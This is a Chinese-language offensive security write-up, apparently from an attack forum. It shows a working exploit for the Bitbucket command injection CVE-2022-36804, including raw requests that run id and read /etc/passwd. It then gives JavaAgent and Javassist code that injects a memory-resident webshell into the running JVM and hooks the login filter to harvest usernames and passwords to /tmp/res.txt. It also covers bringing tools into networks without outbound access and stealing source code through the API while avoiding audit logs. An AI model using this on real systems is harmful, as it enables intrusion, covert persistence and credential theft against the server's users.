0x00 引言
=======

本文是实战中遇到的一个技术点。很多时候我们使用内存马都是反序列化漏洞利用后一条龙直接植入，如log4j时被广泛使用的JNDIExploit此类工具。但有时候我们也会遇到命令拼接等问题获取到的权限，此时仅仅有命令执行而非代码执行的权限。常规的jsp马、cc等手段均无法作为后门，植入内存马成为了我们的第一选择。内存马除了常规的webshell功能外，我们还可以利用内存马完成一些其他的事情。

0x01 CVE-2022-36804
===================

前期通过CVE-2022-36804获取命令执行权限，漏洞原理比较简单，具体可以看这篇文章<https://www.anquanke.com/post/id/280193>。

Bitbucket 是 Atlassian 公司提供的一个基于 web 的版本库托管服务，支持 Mercurial 和 Git 版本控制系统。支持私有化部署。该平台类似gitlab，是一个代码版本控制的平台，一般都是目标的it人员或管理员在使用。支持ldap认证及本地认证，获取到权限我们首先就想到驻留一个长期控制的后门。

通过docker安装环境：

docker pull atlassian/bitbucket-server:7.19.4-jdk11

启动该环境:

docker run -v /data/bitbucket:/var/atlassian/application-data/bitbucket --name="bitbucket" -d -p 7990:7990 -p 7999:7999 atlassian/bitbucket-server:7.19-jdk11

测试该漏洞需要目标存在public项目，需要获取到项目名和repo名。通过链接枚举公开项目:

example.com/repos?visibility=public

测试漏洞：

GET /rest/api/latest/projects/cfx/repos/lord/archive?format=zip&amp;path=bighax&amp;prefix=fusion/%00--remote=/%00--exec=%60id%60%00--prefix=/ HTTP/1.1  
Host: 127.0.0.1:7990  
Cache-Control: max-age=0  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate  
Accept-Language: en-US,en;q=0.9  
Content-Length: 2

成功回显结果:

HTTP/1.1 500  
X-AREQUESTID: @1J1EWV1x490x54736x0  
X-ASEN: SEN-L18735288  
Cache-Control: no-cache, no-transform  
Vary: accept-encoding,x-auserid,cookie,x-ausername,accept-encoding  
Content-Type: application/json;charset=UTF-8  
Date: Tue, 04 Oct 2022 08:10:56 GMT  
Connection: close  
Content-Length: 380  
​  
{"errors":\[{"context":null,"message":"'/usr/bin/git archive --format=zip --prefix=fusion/\\u0000--remote=/\\u0000--exec=`id`\\u0000--prefix=/ -- 49f16ce1e8ad32a360c9db7a3a84a0b72a12c51f bighax' exited with code 128 saying: `id` '/': 1: uid=2003(bitbucket): not found\\nfatal: the remote end hung up unexpectedly","exceptionName":"com.atlassian.bitbucket.scm.CommandFailedException"}\]}

0x02 绕过回显限制
===========

执行命令的回显存在空格截断的问题，使用“|base64 -w 0”将命令base64编码后输出一行执行可以绕过其限制。

rest/api/latest/projects/cfx/repos/lord/archive?format=zip&amp;path=bighax&amp;prefix=fusion/%00--remote=/%00--exec=%60cat%20/etc/passwd%20%7cbase64%20-w%200%60%00--prefix=/!

0x03 尝试写入webshell
=================

linux命令执行条件下写入webshell相信大家都烂熟于心：

echo xxx | base64 -d &gt; 1.jsp

java应用一般有许多复杂的解析规则，一般jsp可能无法解析。 寻找可以被解析的jsp目录最暴力的方式就是搜索应用目录的jsp文件

find / -name .jsp

没有的话我们一般尝试寻找静态资源目录，放jsp看是否能够解析。很可惜这个项目对访问的url有限制。且利用成功后为bitbuctet权限，无法修改配置。

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-2b2dd37087352c8ae94cde8f0ae68b3b1ef84ffc.png)

0x04 植入内存shell
==============

JavaAgent
---------

我们在多数反序列化和webshell利用场景中，都是位于当前web上下文中执行代码。增加一个webFileter/webHanlder等操作通过动态执行代码的方式非常自然。

如何通过命令执行修改已经启动的程序是一个问题，java给出的解决方案是使用JavaAgent，对应的命令行参数为-javaagent:agent.jar。如下图：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c9be13d4e7c8a3183d0aabc98e828b168c145907.png)

简单来说，这种方式提供给程序员操作正在运行中程序jvm虚拟机的可能。我们可以在另一个程序操作已有的jvm虚拟机。这部分代码比较简单，如下图：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-21da1e68061732e41aa1a697347f19226966d23f.png)

1处获取到所有的jvm虚拟机，并找到tomcat对应的虚拟机，2处装载JavaAgent，这里的JavaAgent是一个文件。JavaAgent加载的文件需要包含agentmain或premain等函数：

public static void agentmain(String agentArgs, Instrumentation inst) {  
...  
}

在agentmain中实现我们自己的代码，实现了在另一个jvm中执行任意代码的效果。后续通过反射等手段获取到web上下文进行内存马植入即可。主要参考动态注册的内存马，包括Servlet型、Listener型及Filter型的内存马。

这样我们需要通过大量的反射实现这个效果，除此之外我们有更简单的方法。我们可以重点关注agentmain函数的第二个参数Instrumentation类型，这个类包含许多方法：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-79116265f6becc1464d5fc2a62fa284619c606a9.png)

其中我们最关注的是addTransformer和retransformClasses方法，addTransformer参数为ClassFileTransformer类型。

addTransformer该函数可以将一个ClassFileTransformer类的实例的transform函数返回的字节数组转换成类定义。也就是说我们定义类可以通过字节数组直接实现，而不需要进行传统定义。

配合retransformClasses可以改变正则运行的jvm的class。

JavaAgent例子
-----------

### 第一步

定义一个Peoples类，当中有一个say方法，输出hello

package comm;

public class Peoples {  
public void say(){  
System.out.println("hello");  
}  
}

定义一个程序，每5s调用一次say

package comm;

public class Main {

```php
public static void main(String\[\] args) throws Exception{  
    while (true){  
        new Peoples().say();  
        Thread.sleep(5000);  
    }  
}  
```

}

我们接下来要将这个程序运行起来，通过JavaAgent修改正在运行程序的输出。

### 第二步

新建一个项目，作为我们要载入的jar包，首先定义transformer：

import java.io.File;  
import java.io.FileInputStream;  
import java.io.IOException;  
import java.io.InputStream;  
import java.lang.instrument.ClassFileTransformer;  
import java.security.ProtectionDomain;  
import java.lang.instrument.IllegalClassFormatException;

public class TransformerTest implements ClassFileTransformer {  
@Override  
public byte\[\] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte\[\] classfileBuffer) throws IllegalClassFormatException {

```php
    if (!className.equalsIgnoreCase("Peoples")) {  
        return null;  
    }  
    return getBytesFromFile("E:\\\\AgentTest\\\\target\\\\classes\\\\Peoples.class");  

}  

public static byte\[\] getBytesFromFile(String fileName) {  
    File file = new File(fileName);  
    try  {  
        InputStream is = new FileInputStream(file);  
        long length = file.length();  
        byte\[\] bytes = new byte\[(int) length\];  

        // Read in the bytes  
        int offset = 0;  
        int numRead = 0;  
        while (offset &lt; bytes.length  
                &amp;&amp; (numRead = is.read(bytes, offset, bytes.length - offset)) &gt;= 0) {  
            offset += numRead;  
        }  

        if (offset &lt; bytes.length) {  
            throw new IOException("Could not completely read file "  
                    + file.getName());  
        }  
        is.close();  
        return bytes;  
    } catch (Exception e) {  
        System.out.println("error occurs in \_ClassTransformer!"  
                + e.getClass().getName());  
        return null;  
    }  

}  
```

}

定义agentmain函数：

import java.lang.instrument.ClassDefinition;  
import java.lang.instrument.Instrumentation;  
import java.lang.instrument.UnmodifiableClassException;

public class AgentTest {

```php
public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException, ClassNotFoundException {  
    inst.addTransformer(new TransformerTest(), true);  
    System.out.println("add class success");  
    inst.retransformClasses(Peoples.class);  
    System.out.println("retransform success");  
}  
```

}

修改MANIFEST：

Manifest-Version: 1.0  
Agent-Class: AgentTest  
Can-Redefine-Classes: true  
Can-Retransform-Classes: true

制作pom.xml：

&lt;?xml version="1.0" encoding="UTF-8"?&gt;

```php
4.0.0  

        org.javassist  
        javassist  
        3.20.0-GA  

        com.sun  
        tools  
        1.8.0  
        system  
        C:/Program Files/Java/jdk1.8.0\_221/lib/tools.jar  

org.example  
AgentTest  
1.0-SNAPSHOT  

            maven-assembly-plugin  

                    jar-with-dependencies  

                    src/main/resources/MANIFEST.MF  

                    make-assembly  
                    package  

                        assembly  
```

### 第三步

定义加载器，这里加载器部分的代码也放在了jar包里编译：

import com.sun.tools.attach.VirtualMachine;  
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;  
import java.util.List;

public class AttachAgent {

```php
public static void main(String\[\] args) throws Exception {  

    VirtualMachine                 vm;  
    List vmList;  

    String agentFile = new File( "E:\\\\AgentTest\\\\target\\\\AgentTest-1.0-SNAPSHOT-jar-with-dependencies.jar").getCanonicalPath();  
    System.out.println(agentFile);  
    try {  
        vmList = VirtualMachine.list();  
        for (VirtualMachineDescriptor vmd : vmList) {  
            System.out.println(vmd.displayName());  

            if (vmd.displayName().contains("Main") || "".equals(vmd.displayName())) {  
                vm = VirtualMachine.attach(vmd);  

                if (null != vm) {  
                    vm.loadAgent(agentFile);  
                    System.out.println("MemoryShell has been injected.");  
                    vm.detach();  
                    return;  
                }  
            }  

        }  

        System.out.println("No Tomcat Virtual Machine found.");  
    } catch (Exception e) {  
        e.printStackTrace();  
    }  
}  
```

}

### 第四步

随后重新定义要替换的类，获取该类的字节码：

public class Peoples {  
public void say(){  
System.out.println("world");  
}  
}

在注射器中看到加载成功： ![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e727aeba810b7cec72d768016e79af522e5460fd.png)

主程序显示加载成功但并未生效：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-18c0a12b8ebf135ef377d1e04e74a88cb731034d.png)

### 尝试解决问题

之前认为retransformClasses可以直接修改一个类，但实际存在限制。retransform主要还是强调装饰，想要修改一个类，还是需要redefineClasses：

ClassDefinition def = new ClassDefinition(Peoples.class, Objects.requireNonNull(TransformerTest  
.getBytesFromFile("E:\\\\AgentTest\\\\target\\\\classes\\\\Peoples.class")));  
inst.redefineClasses(new ClassDefinition\[\] { def });  
System.out.println("redefineClasses success");

结果还是不行：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-6317829c7ccf66a1cead93f3dd3037bcc2604dee.png)

### 使用arthas进行诊断

选择虚拟机，进行诊断 ![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a8d4289b442375b45a89c5f5bbce7f82b5da38dc.png)

使用watch检测say方法的时候发现一直没有变化，使用jad反编译，发现此时类定义已经发生变化：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-bda6ccf5c13a116bb0b5e5019cb0baa46d259082.png)

实际上我们已经成功的替换了这个类。

### 解决问题

后续经过对比发现问题，一般的Agent内存马项目替换或者修改的都是jdk当中的类，而这里是在Jar包中和主程序中分别定义了一个Peoples类，虽然代码一样但实际可能不是一个类，即在jar包中：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f058f4b1bf660322a3d27b4724de17b92314447a.png)

不能使用自己的定义，而使用jdk的就没有问题。通过Instrumentation的函数解决这个问题：

Class\[\] classes = inst.getAllLoadedClasses();  
for(Class c : classes) {  
System.out.println("searching");  
System.out.println(c.getName());  
if (c.getName().equalsIgnoreCase("Peoples")) {  
ClassDefinition def = new ClassDefinition(c, Objects.requireNonNull(TransformerTest  
.getBytesFromFile("E:\\\\AgentTest\\\\target\\\\classes\\\\Peoples.class")));  
inst.redefineClasses(new ClassDefinition\[\]{def});  
System.out.println("redefineClasses success");  
}

在jar包中动态获取类，这样不需要类定义。查看结果使用redefineClasses依旧无效。

JavaAssist
----------

上面的例子我们用一个新类去redefineClasses失败了，暂时不清楚是什么原因。目前成熟的Agent内存马项目都是用retransformClasses加上JavaAssist实现的。

Javaassist 就是一个用来 处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。

使用流程如下：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9b6d32d2eda3d034d2d1f8b9571d5c9bdb166fba.png)

我们对刚才的Agent进行修改，首先是agentmain：

Class\[\] classes = inst.getAllLoadedClasses();  
for(Class c : classes) {  
inst.addTransformer(new TransformerTest(), true);  
System.out.println("add class success");  
inst.retransformClasses(c);  
System.out.println("retransform success");  
}

其次是transform：

if(!className.equalsIgnoreCase("Peoples")){  
return null;  
}

```php
    ClassPool classPool = ClassPool.getDefault();  
    classPool.appendClassPath(new LoaderClassPath(loader));  
    CtClass ctClass = null;  
    try {  
        ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer));  
    } catch (IOException e) {  
        e.printStackTrace();  
    }  
    CtMethod ctm= null;  
    try {  
        ctm = ctClass.getDeclaredMethod("say");  
    } catch (NotFoundException e) {  
        e.printStackTrace();  
    }  
    StringBuilder codeBuilder = new StringBuilder()  
            .append("System.out.println(\\"world\\");").append("\\n")  
            ;  
    String beforeCode= codeBuilder.toString();  
    try {  
        ctm.insertAfter(beforeCode);  
    } catch (CannotCompileException e) {  
        e.printStackTrace();  
    }  
    try {  
        return ctClass.toBytecode();  
    } catch (IOException e) {  
        e.printStackTrace();  
    } catch (CannotCompileException e) {  
        e.printStackTrace();  
    }  
    return null;
```

重新注入，发现已经成功修改运行中的函数： ![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3afcaae706136e76f8f6e2bc867e961cce46506b.png)

几个坑点
----

1. 在windows下偶尔会遇到 VirtualMachine.list搜索不到目标进程的情况，多试几次就能找到
2. 使用arthas诊断会影响注入程序的Agent，如下图： ![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-db66817ecd5049c458bb978b6bcd123c7c02f7e6.png)
3. transformer对每个函数都会触发，应当做好判断，若不是要修改的类应该返回原本的字节码，如下 ![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-03a59394e9f64f1150127621b606a019b71bbb16.png)

0x05 实战使用
=========

内存马项目的demo还是挺多的，看了一下完整度比较高的有<https://github.com/threedr3am/ZhouYu>，兼容绝大部分的场景。

简单看一下代码，主要是hook了javax.servlet.http.HttpServlet的service方法：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-2dc327ec6579fdf15f6f21d6903860212d9e7af9.png)

很多内存马都是基于tomcat，hook的是dofiler方法，如<https://github.com/safe6Sec/MemoryShell/blob/master/agent/src/com/demo/agent/Main.java>，不具备通用性。

ZhouYu实现的效果是将这段执行命令的代码注入所有的http请求之前：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-57bcd71494310291ab47f7a1c1e60a0b5864ff01.png)

同时会重写jar包，达到持久化注入内存马的效果：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-26d31db838828b788c4e19bd51f072ee84baedab.png)

实战注入
----

在windows下打包编译后在linux运行报错：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-94839022fe732aed2b7ba329af0e95cffe662c48.png)

看起来是加载器的问题，我们改用之前的加载器在目标编译：

import com.sun.tools.attach.VirtualMachine;  
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;  
import java.util.List;

public class Attach {

public static void main(String\[\] args) throws Exception {

VirtualMachine vm;  
List vmList;

String agentFile = new File("/agent-1.0-SNAPSHOT.jar").getCanonicalPath();  
System.out.println(agentFile);  
try {  
vmList = VirtualMachine.list();  
for (VirtualMachineDescriptor vmd : vmList) {  
System.out.println(vmd.displayName());  
if (vmd.displayName().contains("BitbucketServer") || "".equals(vmd.displayName())) {  
vm = VirtualMachine.attach(vmd);

if ("".equals(vmd.displayName()) &amp;&amp; !vm.getSystemProperties().containsKey("catalina.home")) {  
continue;  
}

if (null != vm) {  
vm.loadAgent(agentFile);  
System.out.println("insert success");  
vm.detach();  
return;  
}  
}  
}

System.out.println("No BitbucketServer Virtual Machine found.");  
} catch (Exception e) {  
e.printStackTrace();  
}  
}  
}

注入的结果如图：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4b5d04fe5e6b0678ef0d228c800a793ec8020143.png)

0x06 扩大利用
=========

使用内存马除了能简单执行命令外，我们还希望可以扩大利用。搜集该服务器上可以利用的资源，一方面我们可以传统的寻找db/配置文件。另一方面，该系统可能被使用oath2、ldap等认证方式。我们可以通过记录密码的手段获取到更多的有效信息。

传统记录密码可能通过js+脚本引擎或使用跨域的请求实现，这里bitbucket用户无法修改js文件。想要记密码需要从服务端想办法。这时候内存马也派上了用场。

查看登录请求，对ZhouYu植入内存的代码稍加修改：

StringBuilder codeBuilder = new StringBuilder()  
.append("if($1.getParameter(\\"j\_username\\")!=null){").append("\\n")  
.append("String password = $1.getParameter(\\"j\_password\\");").append("\\n")  
.append("String username = $1.getParameter(\\"j\_username\\");").append("\\n")  
.append("String ret=username+\\":\\"+password+\\"\\\\n\\";").append("\\n")  
.append("byte\[\] b = ret.getBytes();").append("\\n")  
.append("java.io.File newTextFile = new java.io.File(\\"res.txt\\");").append("\\n")  
.append("java.io.FileOutputStream fw = new java.io.FileOutputStream(newTextFile,true);").append("\\n")  
.append("fw.write(b);").append("\\n")  
.append("fw.close();").append("\\n")  
.append("}").append("\\n")  
;

再次编译并植入，发现虽然显示注入成功但并没有记录到密码。这里当时推测有几种可能性：

1. 植入的代码有问题
2. 代码没有被执行

针对问题1，笔者修改了记录的字段为password，并且将获取到的参数打印在页面中，发现成功记录password参数的值。排除代码的问题。 针对问题2，笔者发现植入ZhouYu代码后，向login发送cmd=id并不会执行命令，也就是说我们植入的代码并没有对所有web请求生效。

经过多次测试，笔者发现只要请求带着j\_username,那么请求就不会进入我们流程。也就是说j\_username的处理逻辑在javax.servlet.http.HttpServlet.service之前或根本没有调用javax.servlet.http.HttpServlet.service。

尝试解决这个问题，笔者首先假设是生命周期的问题，尝试对dofiler进行hook，发现在该接口也无法记录到用户名密码。

在项目所有的依赖中，我们暴力grep j\_username字段，发现有一个类包含这个字段。

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-d853bf7964902a82d940c4c79709345f6ef68709.png)

其中doFilter很显眼，发现继承于GenericFilterBean，最终来自javax.servlet.Filter。我们尝试hook：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-6ca94530d0a3b0dc7af52379c4459afd519186df.png)

提示没有请求体，这应该是个接口/抽象方法，我们只能hook具体实现doFilter的地方。 尝试hook com.atlassian.stash.internal.spring.security.StashAuthenticationFilter的doFilter方法，一堆报错，不知道为什么:

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-bd82f6953635a6eebc91103a4303e481ab88be1d.png)

这时候笔者觉得j\_username的认证可能是中间件完成的，我们只有应用的权限可能无法获取到。那么只有转变思路，寻找程序中类似login(username,password)的函数。

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-658ecc59f5d6d56ec1ad415c190bae3089b321ec.png)

这个函数看起来很对，接受了账户和密码。实际我们需要从javax.servlet.ServletRequest获取。我们尝试hook createContextFromQueryParameters方法，成功记录：

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3942e4b7f263ef513394b9177cf65aea10962cac.png)

这样还是比较明确的，实际上bitbucket这个项目认证模块没有使用javax.servlet.http.HttpServlet.service而是使用了javax.servlet.ServletRequest。javax.servlet.ServletRequest没有类似service这样可以拿到所有请求的函数，所以无法完成全局的hook。具体项目需要具体分析。

几处改动
----

1. 修改被hook的类及方法：
    
    private String\[\]\[\] methods = new String\[\]\[\] {  
    new String\[\] {"com/atlassian/stash/internal/spring/security/StashAuthenticationFilter", "com.atlassian.stash.internal.spring.security.StashAuthenticationFilter", "createContextFromQueryParameters", "\*"},  
    };
2. 修改执行的代码

.append("try {").append("\\n")  
.append("javax.servlet.http.HttpServletRequest request = $1;").append("\\n")  
.append("String password=request.getParameter(\\"j\_password\\");").append("\\n")  
.append("if(password!=null){").append("\\n")  
.append("String username=request.getParameter(\\"j\_username\\");").append("\\n")  
.append("String r=username+\\":\\"+password;").append("\\n")  
.append("byte\[\] res = r.getBytes();").append("\\n")  
.append("java.io.File newTextFile = new java.io.File(\\"/tmp/res.txt\\");").append("\\n")  
.append("java.io.FileOutputStream fw = new java.io.FileOutputStream(newTextFile,true);").append("\\n")  
.append("fw.write(res);").append("\\n")  
.append("fw.close();").append("\\n")  
.append("}").append("\\n")  
.append(" } catch (Throwable throwable) {").append("\\n")  
.append(" throwable.printStackTrace();").append("\\n")  
.append(" }").append("\\n")  
;

3. 生成新的class增加读写文件的依赖：

classPool.importPackage("java.io.File");  
classPool.importPackage("java.io.InputStreamReader");  
classPool.importPackage("java.io.FileOutputStream");

4. 删除修改jar包的代码 bitbucket权限无法修改对应jar包

漏洞武器化
-----

不出网环境利用
-------

该漏洞需要有公开的项目，这种情况在外网很不常见。一般内网才能遇到符合条件环境，并且内网服务器出网一般存在限制。如何不出网利用是一个需要解决的问题。

主要障碍是如何把几百K甚至更大的文件传到服务器上。

我们的思路有两个： 1.通过java原生的命令对源码进行编译，源码通过echo及base64命令写入。 2.寻找上传的地方或记录post包的日志，使用sed/grep将其提取出来。

经过测试笔者发现在搜索触发csrf错误会记录到日志： ![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b01aa31fff914a290475ece571d3f7f9de7760a0.png)

配合linux命令进行提取

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-5937a6c3da32d48aef5979c7cc98edf923e571c5.png)

美中不足的是header中依旧存在长度限制，和get一样需要多次发包。

项目源码获取
------

拖文件系统还原非常的复杂，成本很高。登录用户界面会记录日志。且该项目使用动态js加载，命令行工具从页面获取较为困难。 我们可以进行取巧，bitbucket提供系列api。并且API支持basic认证，可以直接通过api读取文件/下载文件：

<http://192.168.137.204:7990/rest/api/1.0/projects/TEST/repos/test/browse/1.txt> <http://192.168.137.204:7990/rest/api/latest/projects/TEST/repos/test/archive?format=tar.gz>

并且发现bitbuct的后台审计日志并没有记录到日志，结合我们内存马记录到的密码，结果你们懂的。

0x07 总结
=======

通过本文，我们学会了如何远程操作jvm虚拟机给目标植入内存马。内存马的功能除了执行命令，我们可以发散思维，拿到一切可利用的东西，比如从jvm中拿到cookie，拿到链接密钥明文等。给我们的渗透带来进一步的可能。

0x08 源码
=======

涉及的代码已上传github：<https://github.com/7BitsTeam/LearningAgentShell>

0x09 参考
=======

<https://juejin.cn/post/6844904035305127950> <https://juejin.cn/post/7078681608206680094> <https://blog.csdn.net/jklbnm12/article/details/119335763> <https://xz.aliyun.com/t/11003>